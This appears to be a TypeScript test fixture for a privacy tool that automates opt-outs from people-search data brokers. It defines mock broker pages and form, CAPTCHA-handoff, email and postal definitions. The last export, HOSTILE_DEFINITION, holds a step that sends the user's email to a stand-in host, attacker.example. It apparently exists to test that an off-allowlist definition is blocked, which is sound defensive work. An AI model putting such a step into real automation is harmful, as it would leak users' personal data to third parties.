import type { FixtureRoute } from '@deletewe/browser';
import { definition } from './harness.ts';

export const SEARCH_URL = 'https://broker.test/search/ada-lovelace';
export const OPTOUT_URL = 'https://broker.test/optout';
export const CONFIRM_URL = 'https://broker.test/confirm/abc123';

/** A results page with the member plus two decoys who must not be matched. */
export function searchPage(options: { includeMember?: boolean } = {}): string {
  const member = options.includeMember === false ? '' : `
    <li class="result">
      <a class="link" href="/p/ada-lovelace-94704">Ada Lovelace</a>
      <span class="name">Ada Lovelace</span>
      <span class="city">Berkeley</span>
      <span class="state">CA</span>
      <span class="age">Age 46</span>
    </li>`;

  return `<!doctype html><html><body>
    <ul class="results">${member}
      <li class="result">
        <a class="link" href="/p/ada-lovelace-33101">Ada Lovelace</a>
        <span class="name">Ada Lovelace</span>
        <span class="city">Miami</span>
        <span class="state">FL</span>
        <span class="age">Age 23</span>
      </li>
      <li class="result">
        <a class="link" href="/p/hannah-lindqvist-74103">Hannah Lindqvist</a>
        <span class="name">Hannah Lindqvist</span>
        <span class="city">Tulsa</span>
        <span class="state">OK</span>
        <span class="age">Age 66</span>
      </li>
    </ul></body></html>`;
}

export const OPTOUT_FORM = `<!doctype html><html><body>
  <form method="post" action="/optout/submit">
    <input type="hidden" name="csrf" value="fixture-csrf">
    <input id="listing" name="url" value="">
    <input id="email" name="email" value="">
    <button id="submit" type="submit">Submit</button>
  </form></body></html>`;

export const OPTOUT_RECEIVED = `<!doctype html><html><body>
  <p id="receipt">Your removal request was received. Check your email to confirm.</p>
  </body></html>`;

export const CONFIRM_PAGE = `<!doctype html><html><body>
  <p id="confirmed">Your opt-out is confirmed.</p></body></html>`;

/** A page where the form has been redesigned and the selectors no longer match. */
export const OPTOUT_FORM_CHANGED = `<!doctype html><html><body>
  <form method="post" action="/optout/submit">
    <input id="totally-different" name="listingUrl" value="">
  </form></body></html>`;

export function routes(overrides: Partial<Record<string, string>> = {}): FixtureRoute[] {
  return [
    { url: SEARCH_URL, html: overrides['search'] ?? searchPage() },
    { url: OPTOUT_URL, html: overrides['optout'] ?? OPTOUT_FORM, submitsTo: 'https://broker.test/optout/submit' },
    { url: 'https://broker.test/optout/submit', html: OPTOUT_RECEIVED },
    { url: CONFIRM_URL, html: CONFIRM_PAGE },
    { url: 'https://broker.test/p/*', html: '<html><body><p>listing</p></body></html>' },
  ];
}

const BASE = {
  id: 'broker-test',
  name: 'Broker Test',
  homepage: 'https://broker.test',
  version: '1.0.0',
  category: 'people_search',
  jurisdictions: ['US'],
  hosts: ['broker.test'],
  search: {
    method: 'url_template',
    url_template: 'https://broker.test/search/{name_slug}',
    result_selector: '.result',
    fields: {
      name: { selector: '.name', attr: 'text' },
      locality: { selector: '.city', attr: 'text' },
      region: { selector: '.state', attr: 'text' },
      age: { selector: '.age', attr: 'text' },
      url: { selector: 'a.link', attr: 'href' },
    },
  },
  match: {
    fields: { name: 0.4, locality: 0.2, region: 0.15, age: 0.25 },
    thresholds: { review: 0.5, auto_confirm: 0.9 },
  },
  relist: { interval_days: 90 },
  rate_limit: { max_concurrent: 1, min_interval_ms: 1000, daily_cap: 500 },
};

const FORM_STEPS = [
  { id: 'open', action: 'goto', url: OPTOUT_URL, expect: { selector_present: 'form' } },
  { id: 'listing', action: 'fill', selector: '#listing', value: '{{listing_url}}' },
  { id: 'email', action: 'fill', selector: '#email', value: '{{email}}' },
  { id: 'submit', action: 'click', selector: '#submit', expect: { selector_present: '#receipt' } },
];

/** Fully automated form flow, verified by an emailed link. */
export const formBroker = definition({
  ...BASE,
  automation: { level: 'automated' },
  opt_out: { method: 'form', url: OPTOUT_URL, required_fields: ['listing_url', 'email'], steps: FORM_STEPS },
  verification: {
    method: 'email_link',
    expected_senders: ['@broker.test'],
    link_pattern: 'https://broker\\.test/confirm/[A-Za-z0-9]+',
    window_hours: 24,
  },
});

/** Same flow, but it ends at a CAPTCHA we will not solve. */
export const captchaBroker = definition({
  ...BASE,
  id: 'captcha-test',
  name: 'Captcha Test',
  automation: { level: 'assisted', reason: 'CAPTCHA on the opt-out form' },
  opt_out: {
    method: 'form',
    url: OPTOUT_URL,
    required_fields: ['listing_url', 'email'],
    steps: [
      ...FORM_STEPS.slice(0, 3),
      {
        id: 'captcha',
        action: 'handoff',
        reason: 'captcha',
        instructions: 'Complete the challenge on the broker page and press submit.',
        url: OPTOUT_URL,
      },
    ],
  },
  verification: { method: 'none' },
});

/** No form at all: a templated email, fully automatable end to end. */
export const emailBroker = definition({
  ...BASE,
  id: 'email-test',
  name: 'Email Test',
  automation: { level: 'automated' },
  opt_out: {
    method: 'email',
    required_fields: ['full_name', 'address', 'city', 'region', 'postal_code', 'email'],
    steps: [],
    email: {
      to: 'privacy@broker.test',
      subject_template: 'Deletion request for {{full_name}}',
      body_template: 'Please delete records for {{full_name}} of {{address}}, {{city}}, {{region}} {{postal_code}}. Reply to {{email}}.',
    },
  },
  verification: { method: 'none' },
});

/** Postal opt-out: the PDF is real, the dispatch provider is not configured. */
export const letterBroker = definition({
  ...BASE,
  id: 'letter-test',
  name: 'Letter Test',
  automation: { level: 'assisted', reason: 'No postal provider is configured by default' },
  search: { method: 'none' },
  match: { fields: { name: 1 }, require_manual_confirmation: true },
  opt_out: {
    method: 'letter',
    required_fields: ['full_name', 'address', 'city', 'region', 'postal_code', 'email'],
    steps: [],
    letter: {
      recipient: 'Privacy Officer',
      address_lines: ['Broker Test Inc', 'PO Box 1', 'Austin TX 78701'],
      body_template: 'Please delete records for {{full_name}}, {{address}}, {{city}}, {{region}} {{postal_code}}. Confirm to {{email}}.',
    },
  },
  verification: { method: 'none' },
});

/** A definition that reaches off its own host allowlist. Must never run. */
export const HOSTILE_DEFINITION = {
  ...BASE,
  id: 'hostile-test',
  name: 'Hostile Test',
  automation: { level: 'automated' },
  opt_out: {
    method: 'form',
    url: OPTOUT_URL,
    required_fields: ['listing_url', 'email'],
    steps: [
      { id: 'open', action: 'goto', url: OPTOUT_URL },
      { id: 'exfiltrate', action: 'goto', url: 'https://attacker.example/collect?d={{email}}' },
    ],
  },
  verification: { method: 'none' },
};
